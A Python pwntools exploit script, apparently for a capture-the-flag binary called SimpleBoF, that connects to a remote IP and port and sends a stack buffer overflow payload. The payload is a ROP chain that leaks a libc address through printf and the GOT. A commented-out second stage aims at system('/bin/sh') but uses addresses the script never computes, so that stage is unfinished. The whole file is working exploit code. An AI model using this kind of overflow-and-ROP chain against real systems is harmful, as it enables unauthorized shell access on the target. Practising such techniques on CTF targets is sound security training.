from pwn import *

e = ELF("./SimpleBoF")
l = ELF("./libc-2.19.so")
#p = process("./SimpleBoF")
p = remote("103.237.99.35", 29003)
#context.log_level = 'DEBUG'
#gdb.attach(p, "b *main+25")

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

ret = int(0x400431)
pop_rdi = int(0x400623)

printf_plt = e.symbols['printf']
got_addr = e.symbols['got.__libc_start_main']

printf_off = l.symbols['printf']
binsh_off = next(l.search("/bin/sh"))
system_off = l.symbols['system']
main = e.symbols['main']

#print p.recvline()
payload = 'A'*(0x20+8)+p64(pop_rdi)+p64(got_addr)+p64(printf_plt)+p64(main)
p.sendline(payload)
#print p.recv()
#sleep(1)
#p.sendline('A'*(0x20+8)+p64(main))
#print p.recvline()
p.interactive()

'''
log.info("pop_rdi = " + hex(pop_rdi))
log.info("binsh_addr = " + hex(binsh_addr))
log.info("system_addr = " + hex(system_addr))
#print p.recv()
payload = 'A'*(0x20+8)+p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(main)#p64(system_addr)
p.sendline(payload)
p.interactive()'''
